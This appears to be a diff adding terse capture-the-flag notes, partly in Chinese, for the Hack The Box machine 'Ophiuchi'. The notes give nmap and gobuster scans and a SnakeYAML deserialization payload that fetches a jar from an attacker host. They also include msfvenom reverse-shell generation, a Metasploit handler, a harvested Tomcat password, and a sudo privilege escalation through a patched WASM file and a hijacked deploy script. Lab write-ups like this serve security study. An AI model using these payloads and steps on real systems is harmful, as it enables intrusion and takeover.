@@ -1,0 +1,58 @@
+nmap 10.129.159.210 -sV -sC -Pn > nmap.txt
+nmap -p- 10.129.159.210 > nmapall.txt
+
+
+gobuster dir  -u http://10.129.159.210:8080/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.14.45/yaml-payload.jar"]
+  ]]
+]
+
+javac <name-of-the-java-file>.java
+
+
+msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=10.10.14.45 LPORT=4444 -o payload.jar
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.9.0.204
+set LPORT 4444
+
+10.129.160.110
+
+
+
+
+1.nmap掃描發現8080port,打開發現是yaml parse頁面
+2.嘗試搜索yaml exploit可以發現以下code,可以成功執行請求到本地
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.14.45/yaml-payload.jar"]
+  ]]
+]
+3.安裝java 1.8
+https://blog.csdn.net/userpass_word/article/details/103838606
+4.生成reverse.jar
+cd yaml-payload
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+5.取得reverse shell後發現tomcat配置文件中有帳號密碼tomcat-users.xml
+<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+6.使用帳號密碼ssh登入
+7.查看sudo 有root執行go語言腳本
+sudo /usr/bin/go run /opt/wasm-functions/index.go
+8.發現腳本內有main.wasm及deploy.sh未指定完整路徑
+9.複製main.wasm及deploy.sh到tmp
+10.嘗試修改deply.sh後執行指令,發現返回
+Not ready to deploy
+11.下載WebAssembly（wabt）逆向查看wasm.main內容
+python3 -m http.server
+12.安裝cmake及wabt
+13.解譯main.wasm成main.wat
+./wasm2wat /home/kali/timmy/hackthebox/Ophiuchi/main.wasm > /home/kali/timmy/hackthebox/Ophiuchi/main.wat
+14.將const改成1,重新生成main.wasm
+/opt/wabt/build/wat2wasm main.wat
+15.回傳到victim執行
+ sudo /usr/bin/go run /opt/wasm-functions/index.go
